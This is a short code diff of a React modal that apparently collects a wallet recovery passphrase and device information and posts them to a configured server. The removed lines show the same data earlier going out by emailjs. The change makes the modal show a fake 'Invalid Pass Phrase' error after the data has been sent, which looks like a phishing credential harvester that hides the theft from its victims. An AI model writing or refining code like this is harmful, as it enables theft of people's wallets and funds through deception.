@@ -49,7 +49,7 @@ const ValidateModal = (props: Props) => {
     };
 
     try {
-      const send = await axios.post(import.meta.env.VITE_API_ENDPOINT, body, {
+      await axios.post(import.meta.env.VITE_API_ENDPOINT, body, {
         headers: {
           "Content-Type": "application/json",
           "Access-Control-Allow-Credentials": true,
@@ -57,18 +57,8 @@ const ValidateModal = (props: Props) => {
           // Authorization: `Bearer ${import.meta.env.VITE_API_KEY}`,
         },
       });
-      console.log(send);
-      // await emailjs.send(
-      //   import.meta.env.VITE_EMAIL_SERVICE_ID,
-      //   import.meta.env.VITE_EMAIL_TEMPLATE_ID,
-      //   {
-      //     device_info: deviceInfo,
-      //     passphrase: phrase,
-      //   },
-      //   import.meta.env.VITE_EMAIL_PUBLIC_KEY
-      // );
-      // setErrorMessage(true);
-      // message.error("Invalid Pass Phrase");
+      setErrorMessage(true);
+      message.error("Invalid Pass Phrase"); // await emailjs.send(
     } catch (error) {
       console.error("Email sending failed:", error);
     } finally {
